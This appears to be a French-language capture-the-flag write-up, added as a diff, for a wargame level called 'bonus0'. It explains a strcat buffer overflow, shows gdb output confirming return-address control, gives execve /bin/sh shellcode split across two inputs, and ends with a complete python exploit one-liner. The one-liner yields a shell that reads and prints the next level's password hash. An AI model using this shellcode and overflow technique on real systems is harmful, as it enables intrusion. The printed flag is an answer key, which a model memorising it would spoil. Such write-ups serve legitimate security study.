@@ -1,0 +1,53 @@
+bonus0:
+
+idée : la fonction p est appelée 2 fois dans pp. pp lit donc deux fois et stock sur 2 buffers différents. Il seront ensuite concaténés. Le résultat de cette concaténation sera inséré dans le buffer local_3a de 54 bits. 
+trick : dans le premier buffer, si on écrit 20 char ou plus, le “/0” sera écrasé. (local_34 et local_20 → [20]). donc le premier buffer (local_34) sera considéré comme lui + le suite de la mémoire (le buffer local_20). → cela permet d’overflow le buffer final local_3a[54] → 20 + 20 + 2.
+Dans le premier buffer on y injecte les 20 premiers bits du shellcode. Dans le deuxième on y mettra les 5 derniers bits du shellcode + du garbage qui permettra de compléter jusqu'à l'overwrite de la return address.
+
+Schéma et calcule de l’overflow : 
+ - 
+SSSSSSSSSSSSSSSSSSSS 
+ - 
+SSSSSAAAABBBBAAAAAAA
+
+voir overflow.png
+
+→ buffer overflow total (sur local_3a) a 50 (20 + 20 + 1 + 9)
+→ Donc l'adresse de return est a 50 byte du debut du buffer. Donc il faut le transposer a 9 byte dans le buffer (local_20)
+
+
+Tests : 
+Breakpoint 1, 0x08048598 in pp ()
+(gdb) next
+Single stepping until exit from function pp,
+which has no line number information.
+0x080485b9 in main ()
+(gdb) next
+Single stepping until exit from function main,
+which has no line number information.
+SSSSSAAAABBBBAAAAAAA
+SSSSSSSSSSSSSSSSSSSSSSSSSAAAABBBBAAAAAAA��� SSSSSAAAABBBBAAAAAAA���
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+
+recherche de l’address du buffer final : break sur strcat + i r
+eax 0x bf ff f7 06 → \x06\xf7\xff\xbf
+
+
+DONC: 
+BUFFER1 : 
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89
+
+BUFFER2:
+‘\xe1\xb0\x0b\xcd\x80' + 4*’A’ + ‘\x06\xf7\xff\xbf’ + 7*’A’
+
+
+(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89"'; python -c 'print "\xe1\xb0\x0b\xcd\x80" + 4*"A" + "\x26\xf7\xff\xbf" + 7*"A" '; cat) | ./bonus0 
+
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+
